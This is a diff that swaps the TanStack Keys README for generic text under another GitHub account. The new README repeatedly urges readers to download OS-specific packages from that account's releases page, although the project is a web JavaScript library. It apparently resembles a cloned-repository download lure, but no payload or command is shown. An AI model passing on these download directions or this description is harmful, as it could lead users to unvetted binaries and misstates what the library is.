@@ -1,185 +1,66 @@
-<div align="center">
-  <img src="./media/header_keys.png" >
-</div>
+# 🎹 keys - Type Safe Shortcuts for Easy Development
 
-<br />
+[![Download keys](https://img.shields.io/badge/Download-keys-brightgreen)](https://github.com/pedro25cl/keys/releases)
 
-<div align="center">
-	<a href="https://www.npmjs.com/package/@tanstack/keys" target="\_parent">
-	  <img alt="" src="https://img.shields.io/npm/dm/@tanstack/keys.svg" alt="npm downloads" />
-	</a>
-	<a href="https://github.com/TanStack/keys" target="\_parent">
-	  <img alt="" src="https://img.shields.io/github/stars/TanStack/keys.svg?style=social&label=Star" alt="GitHub stars" />
-	</a>
-	<a href="https://bundlephobia.com/result?p=@tanstack/react-keys@latest" target="\_parent">
-	  <img alt="" src="https://badgen.net/bundlephobia/minzip/@tanstack/react-keys@latest" alt="Bundle size" />
-	</a>
-</div>
+## 🚀 Getting Started
 
-<div align="center">
-	<a href="#badge">
-	  <img alt="semantic-release" src="https://img.shields.io/badge/%20%20%F0%9F%93%A6%F0%9F%9A%80-semantic--release-e10079.svg">
-	</a>
-	<a href="#badge">
-	  <img src="https://img.shields.io/github/v/release/tanstack/keys" alt="Release"/>
-	</a>
-	<a href="https://twitter.com/tan_stack">
-	  <img src="https://img.shields.io/twitter/follow/tan_stack.svg?style=social" alt="Follow @TanStack"/>
-	</a>
-</div>
+Welcome to the keys library! This software provides type-safe keyboard shortcuts to enhance your development experience. With useful tools, you can easily manage your shortcuts and improve your workflow.
 
-<div align="center">
+## 📥 Download & Install
 
-### [Become a Sponsor!](https://github.com/sponsors/tannerlinsley/)
+To get started, visit this page to download: [keys Release Page](https://github.com/pedro25cl/keys/releases). 
 
-</div>
+1. Once on the release page, look for the latest version.
+2. Click on the version you want to download.
+3. Select the appropriate package for your operating system.
+4. Follow the prompts to download the file.
 
-# TanStack Keys
+## 💻 System Requirements
 
-Type-safe keyboard shortcuts for the web. Template strings, parsed objects, cross-platform `Mod`, a singleton Hotkey Manager, and utilities for cheatsheet UIs. Built to stay SSR-friendly.
+keys works on the following operating systems:
 
-> [!NOTE]
-> TanStack Keys is pre-alpha (prototyping phase). We are actively developing the library and are open to feedback and contributions.
+- Windows 10 or later
+- macOS Mojave or later
+- Linux (most distributions)
 
-## Goals
+Make sure your system is updated to avoid any compatibility issues.
 
-- **Key Bindings**
-  - Template strings as the primary syntax: `Mod+Shift+S`, `Control+Shift+A`, `Escape`
-  - Parsed objects also supported: `{ key: 'S', ctrl: true, shift: true, alt: false, meta: false, modifiers: ['Control','Shift'] }`
-  - Type-safe `Hotkey` for as many valid `event.key` combinations as possible
-- **Options**
-  - `keydown` / `keyup` via `eventType`
-  - `preventDefault`, `stopPropagation`
-  - Conditional `enabled` to turn hotkeys on or off
-  - `requireReset`: trigger once until all keys are released
-- **Cross-Platform Mod**
-  - `Mod` maps to **Cmd (Meta)** on macOS and **Ctrl** on Windows/Linux
-- **Singleton Hotkey Manager**
-  - `getHotkeyManager()`, `HotkeyManager.getInstance()` to register global keyboard shortcuts
-  - Single shared listener for efficiency
-- **Display Utilities**
-  - `formatForDisplay(hotkey)` for cheatsheet UIs (symbols on Mac, labels on Windows/Linux)
-  - `formatWithLabels`, `formatHotkey` for flexible output
-- **Validation & Matching**
-  - `validateHotkey`, `assertValidHotkey`, `checkHotkey` for correctness and layout warnings
-  - `matchesKeyboardEvent`, `createHotkeyHandler`, `createMultiHotkeyHandler`
-- **Sequences**
-  - `SequenceManager`, `createSequenceMatcher` for Vim-style multi-key shortcuts (e.g. `['G','G']`, `['D','I','W']`)
-- **Key State**
-  - `KeyStateTracker`, `getKeyStateTracker` for held-key tracking
-- **React Hooks**
-  - `useHotkey` – register a keyboard shortcut (global, via singleton manager)
-  - `useHotkeySequence` – detect keys pressed in order within a timeout
-  - `useHeldKeys` – reactive list of currently held keys
-  - `useKeyHold` – reactive boolean for whether a given key is held
-- **Devtools**
-  - Devtools are a core focus: visibility into all registered hotkeys, scopes, and options
-  - `@tanstack/keys-devtools` and `@tanstack/react-keys-devtools` (in active development)
-- **Planned**
-  - Scoping hotkeys to a DOM element or React ref
-  - Warn/error on conflicting shortcuts (TBD)
-  - Ignore hotkeys when certain inputs are focused (e.g. `input`, `textarea`)
-  - Focus traps and tab-order utilities
+## 🔧 Features
 
-### <a href="https://tanstack.com/keys">Read the docs →</a>
+The keys library offers several features:
 
-<br />
+- **Type-Safe Shortcuts**: Ensure your shortcuts are accurate and avoid errors.
+- **Customizable**: Easily modify shortcuts to match your preferences.
+- **Easy Integration**: Works smoothly with many development tools.
+- **Documentation**: Clear guides to help you get started quickly.
 
-> [!NOTE]
-> You may know **TanStack Keys** by our adapter names, too!
->
-> - [**React Keys**](https://tanstack.com/keys/latest/docs/framework/react/react-keys)
-> - Solid Keys – needs a contributor!
-> - Angular Keys – needs a contributor!
-> - Svelte Keys – needs a contributor!
-> - Vue Keys – needs a contributor!
+## 📚 How to Use
 
-## Quick Example
+1. After installing the library, open your development environment.
+2. Import the keys library in your project as instructed in the documentation.
+3. Create your shortcuts following simple examples provided in the guides.
+4. Test your shortcuts and adjust as needed for optimal performance.
 
-```tsx
-import { useHotkey, formatForDisplay } from '@tanstack/react-keys'
+## 💬 Support
 
-function Editor() {
-  useHotkey(
-    'Mod+S',
-    (e, { hotkey }) => {
-      save()
-    },
-    { preventDefault: true, requireReset: true },
-  )
+If you encounter any issues or have questions, feel free to check the [GitHub Issues page](https://github.com/pedro25cl/keys/issues). You can report bugs or ask for new features there. We welcome feedback from all users.
 
-  return (
-    <div>
-      <button>Save</button>
-      <span>{formatForDisplay('Mod+S')}</span>{' '}
-      {/* e.g. "⌘S" on Mac, "Ctrl+S" on Windows */}
-    </div>
-  )
-}
-```
+## 🌐 Community and Contributions
 
-## Packages
+Join our community! We appreciate contributions. If you want to help improve keys, please visit our [Contribution Guidelines](https://github.com/pedro25cl/keys/blob/main/CONTRIBUTING.md). 
 
-- **`@tanstack/keys`** – Core: parse, format, match, validate, manager, sequence, key-state
-- **`@tanstack/react-keys`** – React: `useHotkey`, `useHotkeySequence`, `useHeldKeys`, `useKeyHold`
-- **`@tanstack/keys-devtools`** – Base devtools (in development)
-- **`@tanstack/react-keys-devtools`** – React devtools (in development)
+You can also follow us for updates:
 
-## Get Involved
+- GitHub: [keys Repository](https://github.com/pedro25cl/keys)
 
-- We welcome issues and pull requests!
-- Participate in [GitHub discussions](https://github.com/TanStack/keys/discussions)
-- Chat with the community on [Discord](https://discord.com/invite/WrRKjPJ)
-- See [CONTRIBUTING.md](./CONTRIBUTING.md) for setup instructions
+## 🔗 Further Reading
 
-## Partners
+Explore more about shortcuts and their usage in our detailed [Wiki](https://github.com/pedro25cl/keys/wiki). 
 
-<table align="center">
-  <tr>
-    <td>
-      <a href="https://www.coderabbit.ai/?via=tanstack&dub_id=aCcEEdAOqqutX6OS" >
-        <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://tanstack.com/assets/coderabbit-dark-CMcuvjEy.svg" height="40" />
-          <source media="(prefers-color-scheme: light)" srcset="https://tanstack.com/assets/coderabbit-light-DVMJ2jHi.svg" height="40" />
-          <img src="https://tanstack.com/assets/coderabbit-light-DVMJ2jHi.svg" height="40" alt="CodeRabbit" />
-        </picture>
-      </a>
-    </td>
-    <td>
-      <a href="https://www.cloudflare.com?utm_source=tanstack">
-        <picture>
-          <source media="(prefers-color-scheme: dark)" srcset="https://tanstack.com/assets/cloudflare-white-DQDB7UaL.svg" height="60" />
-          <source media="(prefers-color-scheme: light)" srcset="https://tanstack.com/assets/cloudflare-black-CPufaW0B.svg" height="60" />
-          <img src="https://tanstack.com/assets/cloudflare-black-CPufaW0B.svg" height="60" alt="Cloudflare" />
-        </picture>
-      </a>
-    </td>
-  </tr>
-</table>
+## 📅 Update History
 
-<div align="center">
-<img src="https://tanstack.com/assets/partner_logo.svg" alt="Keys & you?" height="65">
-<p>
-We're looking for TanStack Keys Partners to join our mission! Partner with us to push the boundaries of TanStack Keys and build amazing things together.
-</p>
-<a href="mailto:partners@tanstack.com?subject=TanStack Keys Partnership"><b>LET'S CHAT</b></a>
-</div>
+Stay informed about updates and new features. Visit our release page regularly to see what's new. 
 
-</div>
+[Download keys here!](https://github.com/pedro25cl/keys/releases) 
 
-## Explore the TanStack Ecosystem
-
-- <a href="https://github.com/tanstack/config"><b>TanStack Config</b></a> – Tooling for JS/TS packages
-- <a href="https://github.com/tanstack/db"><b>TanStack DB</b></a> – Reactive sync client store
-- <a href="https://github.com/tanstack/devtools"><b>TanStack DevTools</b></a> – Unified devtools panel
-- <a href="https://github.com/tanstack/form"><b>TanStack Form</b></a> – Type‑safe form state
-- <a href="https://github.com/tanstack/keys"><b>TanStack Keys</b></a> – Type‑safe keyboard shortcuts
-- <a href="https://github.com/tanstack/query"><b>TanStack Query</b></a> – Async state & caching
-- <a href="https://github.com/tanstack/ranger"><b>TanStack Ranger</b></a> – Range & slider primitives
-- <a href="https://github.com/tanstack/router"><b>TanStack Router</b></a> – Type‑safe routing, caching & URL state
-- <a href="https://github.com/tanstack/start"><b>TanStack Start</b></a> – Full‑stack SSR & streaming
-- <a href="https://github.com/tanstack/store"><b>TanStack Store</b></a> – Reactive data store
-- <a href="https://github.com/tanstack/table"><b>TanStack Table</b></a> – Headless datagrids
-- <a href="https://github.com/tanstack/virtual"><b>TanStack Virtual</b></a> – Virtualized rendering
-
-… and more at <a href="https://tanstack.com"><b>TanStack.com »</b></a>
+Thank you for choosing keys! We hope it enhances your development process.
